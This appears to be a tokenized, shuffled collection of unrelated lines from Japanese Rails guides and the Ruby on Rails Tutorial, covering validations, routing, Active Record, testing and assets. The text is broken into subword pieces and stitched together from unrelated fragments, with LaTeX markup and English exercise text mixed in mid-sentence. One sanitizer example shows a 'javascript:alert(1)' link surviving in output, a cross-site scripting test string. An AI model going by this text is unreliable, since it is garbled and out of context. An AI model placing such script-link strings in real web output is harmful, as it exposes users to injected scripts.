▁Rails には 豊 富 な 検証 機能 があり 、 存 在 確 認 、 カラム での 重複 確 認 、 フォーマット 確 認 、 関連付けられたオブジェクト がある かどうか の 確 認 など が 行えます 。
▁[ "1" , ▁" 2 ", ▁"3"]
▁return ▁if ▁self [" Cache - Control "] ▖ present ?
▁ 該 当 の コントローラに 属 する レイアウト がない場合 、` app / views / layouts / application ▖ html ▖ erb ` または ` app / views / layouts / application ▖ builder ` を使用します 。
▁{0} 図 1 ▖7{/0}{1} GitHub の リポジトリ ページ ▟\ href { http :// railstutorial ▖ org / images / figures / github _ repository _ page _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁リスト \ ref { code : gravatar _ option } のコード を使用して 、\ ref { sec : a _ gravatar _ image } で 定義された \ k ode { gravatar \_ for } ヘルパー に オプション の ▁\ k ode { size } パラメータ ー を 取ること が できる ▁(\ k ode { gravatar \_ for ▁user , ▁size : ▁50 } のような コードを ビューで 使用できる ) ▁ ことを確認してください 。
▁ ルート ルーティング を有効に するには 、 「\ # 」 文字 を削除し て コメント を 解除 し 、 コード を書き換え ます ▁( リスト \ ref { code : hello _ root _ route })▟ これにより 、 Rails の ルート ルーティング にアクセスすると Application コントローラの \ k ode { hello } アクション が 動作します
▁< td > <%= ▁book ▖ content ▁%></ td >
▁ 単 に 「 + 1 」 と あり が ち な コメント を 残 す だけで は 、 他の レ ビ ュ ア ー はほとんど 注 目 してくれ ない でしょう 。
▁### ▁ コントローラで データ を保存する
▁self を省略した 結果を リスト \ ref { code : test _ helper _ sign _ in } に示します 。
▁person ▖ errors ▖ messages ▁# ▁=> ▁ { }
▁ そして L oo fa h は N o k o g i ri を使用しています ▟ N o k o g i ri で使用されている XML パ ー サ ー は C と Java の両方 で 記 述 されているので 、 使用している Ruby のバージョン にかかわらず サニタイズ が 高速 化 される ようになりました 。
▁たとえば 、 もし 仮 に ユーザー登録ページ を 手動で テスト し なければならない と したら 、 ブラウザで その ページ を表示し 、 有効な データ と 無効な データを 交 互 に 流 し こ み 、 どちらの 場合にも アプリケーションが 正常に 動作する ことを確認 し なければならない でしょう 。
▁最後に 、 以下の 2 つの ファイルが この リソース の アセット として 生成されます 。
▁{0} 図 11 ▖3{/0}{1} フォローする ユーザーの プロファイル に ▁[ Follow ] ▁ボタンが表示されている ▟\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ other _ profile _ follow _ button _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ postgresql :// localhost / my _ database
▁=> ▁nil
▁ エンジンの レイアウト を ユーザーに 強 制 したくない場合 は 、 この ファイル を削除し 、 エンジンの コントローラ では 別の レイアウト を参照 するよう に変更し てください 。
▁置き換えた結果を リスト \ ref { code : password _ migration } に示します 。
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁` trashed ` ▁= ▁0
▁Action ▁View
▁class _ name : ▁" Order "
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: P er form ance Test ` の導入に伴い ` ActionController :: P er form ance Test ` が 非推奨 となり ました 。
▁` new ` で `@ article ` という インスタンス変数 が 新たに 作成される ようになりました ▟ これを 何 に 使う のか は すぐに わかります 。
▁\ k ode { Gemfile } に CarrierWave を追加する
▁上のように 関連付け を追加した ことで 、 特定の 顧客 用に 新しい 注文 を 1 つ 作成する 作業 が 以下のように 一 行 で できるようになりました 。
▁ nick ▖ save
▁[ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// railstutorial ▖ jp / )
▁ここで \ k ode { : page } パラメータ ー には \ k ode { params [: page ]} が使用されています が 、 これは \ k ode { will \_ paginate } によって自動的に 生成されます 。
▁* ▁` config ▖ assets ▖ version ` は M D 5 ハッシュ 生成 に 使用される オプション 文字列 です 。
▁\ label { table : url _ m app ing } }╼\ end { table }╼╼\ subsection { Contact ページ } ▁% ▁( fold )╼\ label { sec : contact _ page }╼╼
▁最後に 、 新しい テスト 手法 「 ▁ 統合テスト ▁(\ emph { Integration ▁ Test } )」 について 紹介します ▁(\ ref { sec : layout _ link _ tests })▟ 統合テスト を使って 、 最終的な レイアウト や リンク が 正しい かどうかをチェックします 。
▁ マイグレーション コマンド によって Article s テーブル が データベース 上に 作成されます 。
▁x ▁= ▁x ▁+ ▁1
▁ この時点では 、 以下の テストスイート は 失敗する はずです 。
▁ _ これらの フィールド も エスケープ するようにしてください 。
▁上の コマンドで は 、 テスト を生成し ない という オプション を指定して いることにご注目ください 。
▁\ ref { sec : demo _ user _ has _ many _ microposts } では 、\ k ode { user \_ id } という 属性 を使用して 、1 人のユーザー に 複数の マイクロポスト が 関連付け られる という 構造 を 簡潔 に 説明します ▟ 詳細は \ k ode { 第 \ ref { cha : user \_ microposts } 章 } で 完全に 説明します 。
▁ { code : palindrome _ if } ? ▁How ▁does ▁it ▁change ▁if ▁you ▁re as sign ▁the ▁variable ~\ k ode { s } ▁to ▁the ▁string ▁`` \ href { http :// www ▖ dictionary ▖ com / b row se / on o ma to po e ia } { on o ma to po e ia } '' ? ▁\ emph { Hint } : ▁Use ▁up - ar row ▁to ▁retrieve ▁and ▁edit ▁previous ▁commands ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 19 87 0 ' ></ span >╼ \ end { enumerate }╼╼\ begin { code listing }╼\ label { code : palindrome _ if }╼\ code caption { A ▁simple ▁ palindrome ▁test ▖ } ╼ %= ▁ lang : i rb ╼\ begin { code } ╼ > > ▁ puts ▁" It ' s ▁a ▁ palindrome !" ▁if ▁ s ▁== ▁ s ▖ reverse ╼\ end { code }╼\ end { code listing }╼╼ ▁\ subsection { メソッドの 定義 } ▁% ▁( fold )╼ ▁\ label { sec : method _ de f in it ion s }╼╼
▁\ k ode { paginate } では 、 キー が \ k ode { : page } で 値が ページ 番号 の ハッシュ を引数に取り ます 。
▁ これはリスト \ ref { code : test _ helper _ sign _ in } で使用されていました 。
▁Active ▁Support は 言語 レベルで 基本 部分を 底 上 げ して 豊 か な もの に し 、 Rails アプリケーションの 開発 と Ruby ▁on ▁Rails それ 自体 の開発 に 役 立 て る べ く 作 ら れ ています 。
▁これにより 、 これらの コンテナ を 通常の 方法で 簡単に 参 照 でき 、 どの クラス や どの id 属性 を使用 すべき かどうかを 考え ずに 済み ます 。
▁ GUI エディタ の 起動 後 も ターミナル を使用し 続ける ことは できます ▟ ただし 、 Git は デ タ ッ チ 時に コミットメッセージ が 空 のまま ファイルを 閉 じ た とみなす ため 、 コミット は 中 断 されます 。
▁たとえば Ruby ▁\ k ode { ’ 1▖9▖3 ’} を使用している のであれば 、 その バージョン番号 に 書き換えて ください ▟ 本書 での 指定 とは 若 干 異なる ことになります が 、 この 変更 は 問題ありません ) 。
▁ フ ォ ワ ー デ ィ ング 自体 を実装する には 、\ k ode { redirect \_ back \_ or } メソッドを使用します ▟ リクエスト された URL が存在する 場合は そこ にリダイレクトし 、 ない場合は 何らかの デフォルトの URL にリダイレクトし ます ▟ デフォルトの URL は 、 Session コントローラの \ k ode { create } アクション に追加し 、 サインイン 成功 後に リダイレクト します ▁( リスト \ ref { code : friendly _ session _ create }) 。
▁ ▖ field _ with _ errors ▁ {
▁上のコードは 、` app / views / shared / _ menu ▖ html ▖ erb ` パーシャル の内容を その 場所 で レンダリング します 。
▁ 以下のコード は 誤り です 。
▁3 つ目の 引数 ` indent _ empty _ lines ` は 、 空 行 も インデント する かどうか を指定する フラグ です 。
▁ あなた の プルリクエスト に対して 別の 意 見 を持つ コ ン ト リ ビュー タ が い る かもしれません ▟ 多くの 場合 、 プルリクエスト が マージ される まで に パッチ を 何 度 か 更新 する 必要 も ある でしょう 。
▁この 結果 、 本 章では テキストエディタ による 修正 と ブラウザ による 確 認 が ほとんど になります ▟ テスト駆動開発 で 進 め る 唯 一 の 箇所 は 、\ ref { sec : contact _ page } の Contact ページの 追加する 箇所 のみ です 。
▁* ▁` re order `
▁\ k ode { remember _ token } を使用して 現在のユーザー を検索する 。
▁上の 例 でも 示 した ように 、 Active ▁Support は 不 規 則 な 複数形 や 非 可 算 名 詞 について ある程度 知 っています 。
▁この 他 に 、[ S pre e ]( https :// github ▖ com / s pre e / s pre e ) ▁( e コ マ ー ス プラットフォーム ) ▁ や [ Re f in er y C M S ]( https :// github ▖ com / ref in er y / ref in er y cm s ) ▁( C M S エンジン ) ▁ など もあります 。
▁ 英 小文字 、 数字 、 ハイフン 、 ドット のいずれか を 少なくとも 1 文字 以上 繰り返す
▁def ▁set _ business _ headers
▁ サンプルアプリケーション で bcrypt を使用する ために 、\ k ode { bcrypt - ruby } ▁gem を \ k ode { Gemfile } に追加します ▁( リスト \ ref { code : bcrypt _ ruby }) 。
▁module ▁ Y
▁` take ` メソッドで 返す レコード の 最大 数を 数値 の 引数 で 指定することもできます 。
▁Rails の 慣例 では 、 相手 の モデル を指す 外部キー を保持し ている 結合テーブル 上の カラム名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 名前 が 使用される ことを 前提と します 。
▁ 特に 、 現在の サインイン 失敗 テストでは この問題 が キャッチ され ずに パス してしまいます 。
▁require ▁" p ry "
▁NOTE : ▁ これらは すべて 同じ 定義ファイル ` active _ support / core _ ext / date _ time / calculations ▖ rb ` に あります 。
▁ invoice ▖ lines ▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" 23 , 5 67 , 55 6 , 12 "
▁ 詳 細 および 重要な 警 告 については [ sass - rails ドキュメント ]( https :// github ▖ com / rails / sass - rails # feature s ) を参照してください 。
▁ この問題 の 修正 するには と て つ も なく 複雑な 正規表現 を使う 必要があります が 、 これは 演習 問題 に回します ▁({0}{1} 6 ▖ {/1} 5 {/0} ) 。
▁" digest ":" 23 1 a 6 80 f 2 38 87 d 9 d d 7 07 10 ea 5 e fd 3 c 6 2 "} }, " assets ":{" application ▖ js " :
▁* ▁` assets ` は 、 scaffold を生成する かどうかを指定します 。
▁<% ▁if ▁@ article ▖ errors ▖ any ?
▁ 修 飾 されていない 、 素 の 定数名 も使用できます 。
▁for ▁ severity ▁in ▁S ever ity ▖ constant s
▁ ところで 、 Ruby の 例外 処理 に 慣 れ ている 方 なら 、\ k ode { correct _ user } の フィルタ を 以下のように 書く こともできます 。
▁has _ many ▁: appointment s
▁ この章 は 長い う え に 、 学ぶ ことが たくさん あります ▟ 特に 、 これまで データ モデリング を した ことが ない 人 にとって は 、 も しか すると 、 これまで とは 違 った 難 し さ を 感じ る かもしれません 。
▁ サイト レイアウト のリンク を変更する には 、 埋め込み Ruby の 内 側 で if - else 分 岐 構造 を使用します 。
▁この 編集 ページ 上で ユーザー に関する 情報を 変更 し 、[ Update ▁User ] ▁ ボタン を 押 せ ば 、 To y アプリケーション 内の ユーザー情報 が変更され ます ▁( 図 \ ref { fig : demo _ update _ user _ rails _3} ) 。
▁* ▁ データ が データベースに 永続的 に保存 される 前に 検証 ( validation ) を行なう
▁# ▁=> ▁"< p >< a ▁ href =" javascript : alert (1) "> hello </ a ></ p > "
▁\ k ode { require } が追加され ていること に 注意 。
▁" ▁ foo "▖ indent (2) ▁# ▁=> ▁" ▁ foo "
▁ モデル を作成する には ターミナル で 以下のコマンドを実行し ます 。
▁# ▁ ジョブ インスタンス で 行なう 作業
▁before フィルター を使って 実装 した結果 ▁( リスト \ ref { code : authorize _ before _ filter }) ▁ は 、 一度 ログアウト して ユーザー編集ページ ▁(\ href { http ://0▖0▖0▖0:3000/ users /1/ edit }{/ users /1/ edit }) ▁ にアクセス してみる ことで 確 認 できます ▁( 図 \ ref { fig : protected _ log _ in }) 。
▁上のルーティングは ` photos / 12 ` にマッチし 、` Photos ` コントローラの ` show ` アクション に割り当てられ 、` params [: format ]` には ` " jpg " ` が設定され ます 。
▁* ▁ 静 的 アセット の 提 供
▁self を省略した 結果を リスト \ ref { code : password _ reset _ mailer _ test } に示します 。
▁self を省略した 結果を リスト \ ref { code : development _ debugger } に示します 。
▁#### # ▁`: touch `
▁clients ▁= ▁Client ▖ limit (10)
▁ユーザー登録 できるように なったら 、 ログイン や ログアウト を できる 仕 組み を 作り ▁({0}{1} 第 8 章 {/1}{/0} ) 、 {2}{1} 第 9 章 {/1}{/2} から は 不 正 な アクセス を 取り 扱 う 方法 について 学 んで い きます ▁(\ ref { sec : requiring _ logged _ in _ users }) ▁ 。
▁* ▁ ファイル名 と コンテンツ を渡すと 、 Action ▁Mailer と [ Mail ▁gem ]( https :// github ▖ com / m i k el / mail ) が自動的に mime _ type を推測し 、 エンコード を設定し て ファイルを 添付 します 。
▁ これはリスト \ ref { code : signin _ feature s } で使用されていました 。
▁( プロ ト ) ▁ ステータスフィード のテスト 。
▁def ▁article _ params
▁url : ▁ postgresql :// localhost / blog _ development ?
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: Response ` の導入に伴い ` ActionController :: Abstract Response ` が 非推奨 となり ました 。
▁\ k ode { logged \_ in ?} メソッド
▁ 保存 を行わ ずに \ k ode { reload } を実行すると 、 データベースの 情報 を元に オブジェクト を再読み込みする ので 、 以下のように 変更 が 取り 消 されます 。
▁Unix の プロセス
▁これは 、 Ruby が クラス名 に キャメルケース を使う 慣習 があり ▁( 詳細は \ ref { sec : ruby _ classes } で説明します ) 、 また 、 キャメルケース の名前 を使う ことが 好 まれ ている ためです ▟ これらの 慣習 に 必ず 従 わ なければ いけない ということ ではありません 。
▁* ▁` initialize _ cache `: ▁` Rails ▖ cache ` が 未 設定 の場合 、` config ▖ cache _ store ` の値 を参照 して キャッシュ を 初期化 し 、 その 結果を ` Rails ▖ cache ` として 保存 します 。
▁ インデックス ビューで 最初の リファクタリング を行う 。
▁< small >
▁* ▁`: argument s ` ▁- ▁ コマンドライン に与える 引数 。
▁この 記 法 を 現在のユーザー のコンテキストで 使用する と 以下のように 簡潔 な コード で 表現 できるようになります 。
▁ ブラウザ を 立 ち 上 げ て ルート URL にアクセス し 、 それぞれの リンク をクリックして 確かめ ることもできます が 、 変更 する 度 に この 作業を 毎 回 繰り返し て い く のは 大きな 負 担 です 。
▁render ▁ html : ▁"< strong > Not ▁F ound </ strong > "▖ html _ safe
▁create _ table ▁: public ation s ▁do ▁| t |
▁xml ▖ description ▁" Base c amp : ▁Re c ent ▁ items "
▁ これら プリコンパイル 済み アセット には 、 いわゆる 遠 い 将来 に 期限切れ になる ヘッダ ▁( f ar - future ▁headers ) ▁ はデフォルトで は 含 まれ て いません ▟ したがって 、 フィンガープリント のメリット を得る ためには 、 サーバー の設定 を更新し て この ヘッダ を含め る必要があります 。
▁set _ callback ▁: save , ▁: ar ound , ▁-> ( r , ▁block ) ▁ { ▁ stuff ; ▁result ▁= ▁block ▖ call ; ▁ stuff ▁ }
▁なお 、\ k ode { follower } の関連付け については 、\ ref { sec : followers } に 入 る まで は 使い ません ▟ しかし follower と followed を 対 称 的に 実装 しておくこと で 、 構造 に対する 理解 は 容易に なる はずです 。
▁ ルーティング を ネスト する ▁( 入 れ 子 にする ) ▁ ことで 、 この 親 子 関係 を ルーティング で 表 す ことが できるようになります 。
▁` has _ many ▁: through ` 関連付け は 、 ネストした ` has _ many ` 関連付けを 介 して 「 シ ョ ート カ ッ ト 」 を設定する 場合にも 便利です 。
▁` suppress ` は 、 ある ブロック の 実行時に 例外 が発生し 、 その 例外 が ( ` k in d _ of ?` による 判 定 で ) いずれ か の 引数に 一致する 場合 、 それを キ ャ プ チ ャ して 例外を発生 せずに 戻 ります 。
▁ 現在の サンプルアプリケーション には 、 ユーザーインデックスページ を 端 から 探 す か 、 他の ユーザーの フィード を表示する 以外に 、 他の ユーザーを 検索 する手段 が ありません 。
▁# ▁ 今 年 を デフォルト値 に 持ち 、 Date ▖ today で 得 られた 日 の 前 後 5 年 を オプション に 持つ セレクト ボックス を生成する
▁ フォーム 送信 をテストするために は 、 ▁\ text tt { users _ path } に対して \ k ode { POST } リクエストを送信する 必要があります ▁( 表 \ ref { table : table - RESTful _ users })▟ これは 、 次のように \ text tt { post } 関数 を使って 実現 できます
▁続いて 、 同じ 内容 の テキスト メール も 作成 しましょう 。
▁ コメント 部分 に コードを 書 け ば 、\ k ode { log _ in _ as } ヘルパーメソッド が でき あ が ります ▁( リスト \ ref { code : test _ helper _ log _ in }) 。
▁リスト \ ref { code : valid _ user _ test } では 、 シンプルな \ k ode { assert } メソッドを使って テスト します ▟\ k ode {@ user ▖ valid ?} が \ k ode { true } を返す と 成功 し 、\ k ode { false } を返す と 失敗します 。
▁% w ( Earth ▁Wi nd )▖ to _ sentence ▁# ▁=> ▁" Earth ▁and ▁Wi nd "
▁custom _ helpers ▁( end )╼╼ ▁% ▁section ▁ motivation ▁( end )╼╼ ▁\ section { 文字列 ( string ) と メソッド } ▁% ▁( fold )╼ ▁\ label { sec : string s _ and _ methods }╼╼
▁ 前述の \ k ode { rails ▁new } コマンド ▁( リスト \ ref { code : rails _ new _ sample _ app }) ▁ を実行すると 、 レイアウト も デフォルトで 作成されます ▟ ここでは 学習 の ため 、 一時 的に 以下のように ファイル名 を 変更します 。
▁`: dependent ` オプション の動作 は以下のように 対象 によって 異なります 。
▁ このコード で 使用している \ k ode { second } メソッドは 、 実は Ruby 自身 の一部 ではなく 、 Rails が 追加 した ものです 。
▁ 更新 リクエスト が発生し たとき の ` lock _ version ` の 値が データベース上の ` lock _ version ` カラム の値 よりも 小さい 場合 、 更新 リクエスト は 失敗 し 、` ActiveRecord :: StaleObjectError ` エラーが発生し ます 。
▁ バ イ ナ リ 実行 可能 ファイル
▁\ href { http :// a i rb n b ▖ com /}{ A i rb n b }、\ href { http :// base c amp ▖ com /}{ Base c amp }、\ href { http :// d isney ▖ com /}{ D isney }、\ href { http :// github ▖ com /}{ GitHub }, ▁\ href { http :// h ul u ▖ com /}{ H ul u }、\ href { http :// k ic k start er ▖ com /}{ K ic k start er }、\ href { http :// s hopify ▖ com /}{ S hopify }、\ href { http :// twitter ▖ com /}{ Twitter }、\ href { http :// y ellow pages ▖ com /}{ Y ellow ▁Pages } など 多くの 企 業 で Rails が 採 用 されています 。
▁Action ▁Dispatch er の ミドルウェアスタック
▁上のコードによって以下 のような 感じ で 生成されます 。
▁この 画面 に コメント を表示できるように したい ので 、` app / views / articles / show ▖ html ▖ erb ` に 以下のコード を追加しましょう 。
▁ //= ▁require ▁ jquery
▁#### # ▁` association ( force _ reload ▁= ▁false ) `
▁ バリデーション は 、 SQL の データベース への 送信 前に 行う のが普通です 。
▁` unscope ` を リレーション に 適用 すると 、 それ に マージ される すべての リレーション にも 影 響 します 。
▁ただし 、 以下の オプションを 設定 した 関連付け では 、 逆 関連付け は自動的に は 設定 されません 。
▁\ k ode { micropost _ params } で S trong ▁Parameters を使用している ことにより 、 マイクロポストの コンテンツ だけ が Web 経由で 編集 可能 になっている ことに注目してください 。
▁` assert _ valid _ keys ` メソッドは 任意の 数 の 引数 を 取ること が でき 、 ホワイトリスト に 含まれていない キー が レシーバ にある かどうかをチェックします 。
▁ )
▁ 他にも 、 " ü " という文字 のは ず が " Ã 1 ⁄ 4 " という文字 に 変 わ っている 、 などの 症 状 もあります 。
▁### ▁ ビューの アセット ヘルパー 参 照 から : cache オプション と : concat オプション を削除する
▁ 今回 も同様に 慣例 に従い 、 セッション の 削除 ▁( サインアウト ) ▁ には \ k ode { destroy } を使用します 。
▁# ▁@ @ emulate _ boolean s にアクセス して デフォルト値 を true にする クラスメソッド を 生成
▁root ▁GET ▁ / ▁ welcome # index
▁ メールの リスト の 形式 は 、 メールアドレス の配列 でも 、 メールアドレスを カ ン マ で 区 切 った 文字列 でも 構 いません 。
▁mail ▖ perform _ deliveries ▁= ▁false
▁ これはリスト \ ref { code : before _ create _ activation _ digest } で使用されていました 。
▁` Rails ▖ application ` は Rails アプリケーションを Rack アプリケーション として 実装 した ものです 。
▁#### ▁ 別の コントローラ から アクション の テンプレート を出力する
▁git @ heroku ▖ com : st or my - cloud - 5 88 1 ▖ heroku app ▖ com
▁ それぞれの アクション では 、 タイトル を設定し 、 ユーザー を検索し 、\ k ode {@ user ▖ following } または \ k ode {@ user ▖ followers } から データ を取り出し 、 ページネーション を 行 な って 、 ページ を出力する 必要があります 。
▁</ footer >
▁次に 、 ユーザー を含む インスタンス変数 を作成して ビューで 使えるように し 、\ k ode { user ▖ email } に メール送信 します ▁( リスト \ ref { code : mail _ account _ activation }) 。
▁` dup ` メソッドは デ ィ ー プ コピー を行わ ないので 、 配列 の中に ある 文字列 は 複 製 後 も 同 一 オブジェクト のまま です 。
▁ マイクロポスト 用の CSS ▁( 本 章で 利用 する CSS の すべて )
▁The ▁problem ▁is ▁that ▁we ▁want ▁the ▁microposts ▁to ▁exist ▁immediately , ▁so ▁that ▁the ▁timestamp s ▁are ▁in ▁the ▁right ▁order ▁and ▁so ▁that ▁\ k ode {@ user ▖ microposts } ▁isn ’ t ▁empty ▖ ▁We ▁accomplish ▁this ▁with ▁\ k ode { let !} , ▁which ▁ force s ▁the ▁corresponding ▁variable ▁to ▁come ▁into ▁exist ence ▁immediately ▖
▁Rails で の開発 経験 者 であれば 、 この時点で \ k ode { content \_ for } の使用 を 検 討 する と思います が 、 残念ながら Asset ▁Pipeline と併用する と 正常に動作し ない ことがあります 。
▁ 基 礎 に 基 づ いた ウェブ 開発 に 重 点を 置 き ながら ( Rails だけ に 偏 る の ではなく ) 、\ r or t \ は \ emph { 高 度 技術 力 } を学ぶ ための 幅 広 い スキル を 身 に 付ける ことができる ▟ ( Bo x ~\ ref { aside : technical _ sophistication }), \ foot note { \ xkcd use ▖ } ▁ そして 、 高 度 技術 力 の 主要な 理 念 は ▁\ let b d \ ▁ チュートリアル から 派 生 しています ▟\ foot note { learn en ough ▖ com / s to ry } ▁ 特に 、 この ▁ Learn ▁En ough ▁introduc to ry ▁ sequence ▁ には \ r or t を 読み 始 め る 前に 知 っ ておく べ き 適 した 内容 が含まれている ▟ が 必 須 条件 のように 、 例えば 、 ▁\ le c l 、\ foot note { learn en ough ▖ com / command - line } ▁ には ( 現在の チュートリアル には ない ) 初心者 向 け の内容 で 書かれてい ます ▟ ╼╼ ╼\ begin { aside }╼\ label { aside : technical _ sophistication }╼\ head ing { Technical ▁ sophistication }╼╼\ r or t \ ▁ は ▁\ let b d \ ▁ チュートリアル の 仲 間 のような 本 です ▟ な ぜ なら 、 これらの チュートリアル は 一 つの テーマ を元に して 書かれた からです ▟ その テーマ は 、 ▁\ emph { 高 度 技術 力 } : ▁ ハ ー ド と ソ フ ト スキル を 用 い ること によって 、 どんな に 高度な 技術 でも これらの スキル 合わせ る ことにより 、 魔 法 のように 解決 出 来 るように 思える ことです ▟ ▁( Figure ~\ ref { fig : tech _ support _ cheat _ sheet })▟ ▁ ウェブ 開発 の中で は 、 プログラミング は 必要な 高 度 技術 力 ですが 、 それ 以外に も アプリ の メニュー を 選択 する ことにより 得 られる 、 能 力 を 十分 に 活用 したり 、 分 から ない ぶ ぶ を
▁### ▁ キャッシュ 制御
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁password : ▁" secret ", ▁except : ▁ [: index , ▁: show ]
▁ プロフィール画面 ▁(\ href { http ://0▖0▖0▖0:3000/ users / 2 }{/ users / 2 }) ▁ に ▁[ Follow ] ▁ボタンが表示されている
▁ この節 の目的は Cucumber の お い し さ ▁( 間 違い なく シ ャ キ シ ャ キ して 汁 気 た っ ぷ り です ) ▁ を 知 っ てもらう ための 、 い わ ば 試 食 です ▟ もし 気 に 入 って いた だけ たら 、 テスティング ツール に関する 完 結 した 書 籍 がいくつも あります 。
▁ 下 部 には ユーザー 作成 用の フォーム が表示されます 。
▁| ▁| ▁20 7 ▁| ▁: multi _ status ▁|
▁ サーバーを再起動 します 。
▁# ▁</ objects >
▁この データモデル には 他にも 解決 し なく て は いけない 問題 があります ▟ Facebook のような 友 好 関係 ▁( F ri end ship s ) ▁ では 本質的に 左 右 対 称 の データモデル が 成り立 ち ますが 、 Twitter のような フォロー 関係 では \ emph { 左 右 非 対 称 } の 性 質 があります ▟ すなわち 、 Calvin は Hobbes を フォロー して いて も 、 Hobbes は Calvin を フォロー していない といった 関係 性 が 成り立 つの です 。
▁これらの アクション 同士 の違い は 、 それらの アクション に対応する \ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ request # Request _ methods } { HTTP ▁request メソッド } の違い で もあります 。
▁[ 2, ▁4 , ▁6 , ▁ 8, ▁10 ] ▖ sum ▁# ▁=> ▁30
▁Get ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁ よく ある バリデーション には 、 存在性 ・ 長さ ・ フォーマット など がある
▁デフォルトでは 、 エンジン 内部 のルーティング は アプリケーションの ルーティング から 分 離 されています 。
▁### ▁ 既存の ルール を 一覧 表示する
▁上のコードでは 、 `@ customer ` インスタンス変数 に ` Customer ` モデルのインスタンス が含まれている とします ▟ この場合 レンダリング には ` _ customer ▖ html ▖ erb ` パーシャル が使用され 、 この パーシャル には ` customer ` ローカル変数 が渡され ます ▟ この ` customer ` ローカル変数 は 、 親 ビュー にある `@ customer ` インスタンス変数 を指します 。
▁ テストを もうひとつ 追加 して いることにご注目ください ▟ この 追加 テストでは 、 ユーザーの 記憶ダイジェスト が 記憶トークン と 正しく 対応 していない 場合に 現在のユーザー が \ k ode { nil } になる かどうかを チェック しています ▟ これによって 、 以下の ネストした \ k ode { if } ス テ ート メ ン 内の \ k ode { authenticated ?} の 式 をテストします 。
▁ http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / account _ activations / ╼ f F b _ F 9 4 m g Q t m l S v R F G s IT w / edit ?
▁ suppress ( ActiveRecord :: StaleObjectError ) ▁do
▁ 環境変数 を経由して データベース接続 を設定する 方法 が 2 とおり あるので 、 この 2 つ が どのように 相 互 作 用 するか を 理解 しておくこと が重要です 。
▁Active ▁Record では \ emph { 検証 ▁( バリデーション : ▁validation ) ▁ } を使用して そのような 制 約 を与える ことができます 。
▁このメソッド を使うと 、 ユーザーの メールの テストを エスケープ できます
▁次に ターミナル で 以下の \ k ode { heroku } コマンドを実行 します ▁( 実行 前に ターミナル の 終 了 と 再起動 が 必要な ことがあります ) 。
▁ 見つからない 場合は 次に ` application / new ` という テンプレート がある かどうか を探し ます 。
▁" DateTime " ▁=> ▁" datetime ",
▁これらの テスト を実装 した ことによって 、 う っかり 誰 でも 編集 でき てしまう バグ が あって も 、 すぐに 検 知 できるようになりました 。
▁#### ▁ コレクション ルーティング を追加する
▁ 苦 労 するのは 自分 だけ ではありません ▟ これは どんな 開発者 でも 幾 度 と なく 通 過 する 道 です ▟ ここで の 苦 労 は い つ か 必ず 報 わ れる ことは 、 著者 が 保 証 いた します 。
▁Active ▁Record とは 、[ MVC ]( http :// ja ▖ w ikipedia ▖ org / wiki / Model _ View _ Controller ) で言う ところ の M 、 つまり モデル に相当 する もの であり 、 ビ ジ ネ ス データ と ビ ジ ネ ス ロ ジ ッ ク を表す システム の 階層 です 。
▁上のコードは 、 HTML の 部分を ' another _ template ▖ html ▖ erb ' テンプレート を使用して レンダリング し 、 テキスト 部分を `: text ` で レンダリング しています 。
▁ここでは 、 登録 後に 別の ページ を表示する ように し 、 その ページ が 新規 作成された ユーザープロファイル であること が わかるように します 。
▁デフォルトは "1" ですが 、 容易に 変更 できます 。
▁### ▁Rack について 詳 しく 学ぶ
▁About ページ のコード ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁My J ob ▖ set ( queue : ▁: another _ queue )▖ perform _ later ( record )
▁ ユーザー登録ページ ▁ / signup ▁ のルーティング は 、 Users コントローラ ー の \ k ode { new } アクションに 既に 紐 付け ら れ ている ことを思い出してください ▁( リスト \ ref { code : signup _ route })▟ したがって 、 次の ステップ は 、 ▁\ k ode { form \_ for } の 引数 で 必要となる User オブジェクト を作成する ことになります
▁{0} 図 3 ▖ 7 ▁{/0}{1} ルート URL にアクセスすると Home ページ が表示される {/1}
▁To y アプリケーションの 簡潔 な ユーザー \ k ode { index } アクション
▁デフォルトのエラーメッセージは ▁_" is ▁re serv ed " _ ▁ です 。
▁ 筆者 はこの ことに 気 付 いた 場合に 、 テストを 忘れ ている 疑 い のある コード ブロック 内に わざと 例外 発生 を 仕 込 む という 手法 を 好 んで 使い ます ▟ その コード ブロック が テスト から 漏 れ ていれば 、 テストは パス してしまう はずです ▟ コード ブロック が テスト から 漏 れ ていなければ 、 例外 が発生し て テストが 中 断 するはずです ▟ 現在の コード で これ を行って み た 結果を リスト \ ref { code : branch _ raise } に示します 。
▁ 特定の 分 野 で モデリング の 経験 を 多く 積 め ば 、 このような ユーティリティ メソッド が必要になる こと を事前に 思い 付ける ように なる でしょう ▟ たとえ 思い 付け ないこと が あった としても 、 明 確 な テストを 書 こう と するときに 、 い つの 間 に か こう い う メソッドを 自分 が 作成 している ことに気付く ことでしょう 。
▁ 本書 の テストスイート は 認証システムを ほぼ カ バー しています が 、 すべて をカバー している わけではありません ▟ この 点を ご 了 承 ください 。
▁### ▁ テスト を実行する
▁上の 正規表現 には 少しだけ 残 念 な 点 があります ▟\ k ode { foo @ bar ▖ ▖ com } のような ドット の 連続 を 誤り として 検出 できません 。
▁ これも ` render ` メソッド だけで 行なうことができます ▟ ` render ` メソッド には ` app / views ` を 起 点 と する フルパス を渡すことができます ので 、 出力 したい テンプレート を フルパス で 指定します 。
▁ データベース の中で 合 計 を 計算 した ほ う が 高速 になる ことを思い出してください ▟)
▁ 大文字 小文字 を 区別 しない 、 重複 する メールアドレス の 拒 否 のテスト 。
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁rows ▁| ▁ Extra ▁|
▁ 読み込み 順 についても 前述の とおり 反映され ます 。
▁2 ) ▁# ▁=> ▁false
